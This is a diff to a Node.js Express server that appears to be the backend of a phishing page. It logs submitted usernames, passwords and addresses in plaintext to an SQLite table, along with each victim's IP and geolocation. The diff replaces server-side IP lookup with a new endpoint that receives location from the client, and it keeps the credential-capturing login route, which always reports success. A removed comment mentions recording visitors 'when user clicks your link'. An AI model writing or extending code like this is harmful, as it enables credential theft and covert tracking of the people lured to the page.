@@ -1,7 +1,6 @@
 const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
-const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
@@ -20,45 +19,32 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
-async function getLocation(ip) {
-    if (!ip || ip === 'Unknown') return 'Unknown';
-    try {
-        const res = await fetch(`https://ipapi.co/${ip}/json/`);
-        const data = await res.json();
-        if (data && data.country_name) {
-            return `${data.city || ''}, ${data.region || ''}, ${data.country_name}`.trim();
-        }
-    } catch (e) {}
-    return 'Unknown Location';
-}
-
-async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
+function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown', location = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    const location = await getLocation(ip);
-
     db.run("INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)",
         [type, username, password, address, ip, location, timestamp]);
-
-    console.log(`📍 ${type} | IP: ${ip} | Location: ${location}`);
 }
 
-// Record immediately when user clicks your link
-app.get('/', async (req, res) => {
+// Record visit from client geolocation
+app.post('/api/record-visit', (req, res) => {
+    const { location } = req.body;
     const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    await saveRecord('Page Visit', null, null, null, ip);
+    saveRecord('Page Visit', null, null, null, ip, location || 'Unknown');
+    res.json({ success: true });
+});
+
+app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.get('/login.html', async (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    await saveRecord('Page Visit', null, null, null, ip);
+app.get('/login.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-app.post('/api/login', async (req, res) => {
+app.post('/api/login', (req, res) => {
     const { username, password, address } = req.body;
     const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    await saveRecord('Login Attempt', username, password, address, ip);
+    saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
 
@@ -79,5 +65,5 @@ app.post('/api/clear', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running with permanent storage`);
+    console.log(`🚀 Server running`);
 });
